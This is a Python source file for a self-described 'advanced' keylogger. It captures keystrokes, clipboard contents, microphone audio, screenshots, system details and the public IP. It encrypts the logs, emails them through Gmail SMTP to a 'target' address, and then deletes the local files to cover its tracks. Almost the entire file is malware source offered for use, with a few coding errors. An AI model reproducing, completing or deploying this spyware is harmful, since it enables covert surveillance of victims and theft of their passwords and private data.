# This is a sort of "advanced" keylogger made by gobinathan-l. If you are using this tool, kindly make sure you installed all the Modules.
# Please refer to the references.text for the resources i used while writing this Script.
# There are still many improvements to be made and this Script is actively under improvement.

#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography import fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import getpass

#Log File Info
keylogs       = "keylogs.txt"
systeminfo    = "sysinfo.txt"
clipboardinfo = "clipboard.txt"
keypath       = "D:\\Docs\\My Python Projects\\7 Pylogger (My Keylogger based on Python)"
extend        = "\\"
micinfo       = "audio.wav"
screeninfo   = "screen.png"
keypathfull = keypath + extend

keylogs_enc     = "keylogs_enc.txt"
systeminfo_enc      = "sysinfo_enc.txt"
clipboardinfo_enc   = "clipboard_enc.txt"
key             = "DbMMQtBeJvVtB-QU21FCLpVuDyTxWEEPPdxYum4PSzs="

#Email Info
email       = "YOUR MAIL"
password    = "YOUR PASSWORD" # Make sure you enable the "less secure apps feature in account settings to make google allow this login."
toaddress   = "TARGET EMAIL ADDRESS"

#Controls
mic_time             = 10
time_iteration       = 15
no_of_iterations_end = 3

#To send Mail with Attachments
def send_mail(filename, attachment, toaddress):
    fromaddress = email
    msg = MIMEMultipart()
    msg['From'] = fromaddress
    msg['To']   = toaddress
    msg['Subject'] = "Log File"
    body = "You have recieved KeyLogs. Hooray!!"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddress, password)
    text = msg.as_string()
    s.sendmail(fromaddress, toaddress, text)

send_mail(keylogs, keypath+extend+keylogs, toaddress)

#To get PC Info
def pc_info():
    with open(keypath+extend+systeminfo, 'w') as pc:
        hostname  = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            pc.write("The Public IP Address is : " + public_ip + "\n")
        except Exception:
            pc.write("Couldn't get Public IP." + "\n")
        pc.write("Processor : " + (platform.processor()) + "\n")
        pc.write("OS : " + (platform.system()) + " " + (platform.version()) + "\n")
        pc.write("Machine : " + platform.machine() + "\n")
        pc.write("Hostname : " + hostname + "\n")
        pc.write("Private IP : " + IPAddress + "\n")

pc_info()

#To get Clipboard content
def clipboard_info():
    with open(keypath + extend + clipboardinfo, 'a') as clip:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clip.write("Clipboard Data : \n" + clipboard_data + "\n")
        except:
            clip.write("Clipboard could not be copied"+"\n")

clipboard_info()

#To get Mic recording
def mic_info():
    samplefq = 44100
    seconds  = mic_time
    recording = sd.rec(int(seconds * samplefq), samplerate=samplefq, channels=2)
    sd.wait()
    write(keypath+extend+micinfo, samplefq, recording)

mic_info()

def screen_info():
    image = ImageGrab.grab()
    image.save(keypath + extend + screeninfo)

#To get Screenshots
screen_info()

no_of_iterations = 0
currentTime  = time.time()
stoppingTime = time.time() + time_iteration

while no_of_iterations < no_of_iterations_end:

    count    = 0
    keys     = []


    #Functions for Different Key Events
    def on_press(key):
        global count, keys, currentTime
        print(key)
        keys.append(key)
        count +=1
        currentTime = time.time()
        if count >=1:
            count = 0
            write_logs(keys)
            keys = []

    def write_logs(keys):
        with open(keypath + extend + keylogs, "a") as logs:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0: # To add a new line after a Space
                    logs.write("\n")
                    logs.close()
                elif k.find("Key") == -1:
                    logs.write(k)
                    logs.close

    def on_release(key):
        if key == Key.esc:
            return False # Exits when Escape is pressed
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(keypath+extend+keylogs, 'w') as file:
            file.write(" ")
        screen_info()
        send_mail(screeninfo, keypath+extend+screeninfo, toaddress)
        clipboard_info()
        no_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

#Encrypting the Files with Fernet Obfuscater in Python
files_to_encrypt = [keypathfull+systeminfo, keypathfull+clipboardinfo, keypathfull+keylogs]
encrypted_filenames = [keypathfull+systeminfo_enc, keypathfull+clipboardinfo_enc, keypathfull+keylogs_enc]

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encrypted_filenames[count], 'wb') as encfile:
        encfile.write(encrypted)

    send_mail(encrypted_filenames[count], encrypted_filenames[count], toaddress )
    count+=1

time.sleep(120)

#To clean the Log Files
delete_files = [systeminfo, clipboardinfo, keylogs, screeninfo, micinfo]
for file in delete_files:
    os.remove(keypathfull + file)
